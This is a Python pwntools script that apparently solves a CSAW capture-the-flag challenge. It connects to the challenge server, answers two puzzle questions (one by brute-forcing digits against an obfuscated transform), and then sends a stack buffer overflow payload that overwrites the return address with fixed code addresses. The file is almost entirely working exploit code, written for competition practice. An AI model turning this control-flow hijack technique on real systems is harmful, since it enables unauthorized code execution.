from pwn import *

debug = False

r = remote("pwn.chal.csaw.io", 5004, level = 'debug') if debug else remote("pwn.chal.csaw.io", 5004)

r.recvuntil("What is the square root of zopnol?\n")
r.sendline("1804289383")

def second_question_function(a1, a2):
    return (12 * (a2 - 48) - 4 + 48 * (a1 - 48) - (a2 - 48)) % 10

def second_question(ans):
    ans = [ord(x) for x in ans]
    for i in range(len(ans) - 1):
        current = ans[i + 1] - 48
        ans[i+1] = (current + second_question_function(ans[i], (i + ans[i]))) % 10 + 48
    return "".join(chr(x) for x in ans)

guess = "7"
target = "7759406485255323229225"
for i in range(1, 22):
    for digit in range(10):
        trial = guess + str(digit)
        if second_question(trial) == target[:i+1]:
            guess = trial
            break
    else:
        print(f"something went wrong, all digits failed at i: {i} while guess was {guess}")
        break

r.recvuntil("How many tewgrunbs are in a qorbnorbf?\n")
r.sendline(str(guess))

addr = 0x4014fb
payload = 16 * b'A' + p64(0x4016d3)+ p64(addr)

r.recvuntil("How long does it take for a toblob of energy to be transferred between two quantum entangled salwzoblrs?\n")
r.sendline(payload)
print(r.recvall())
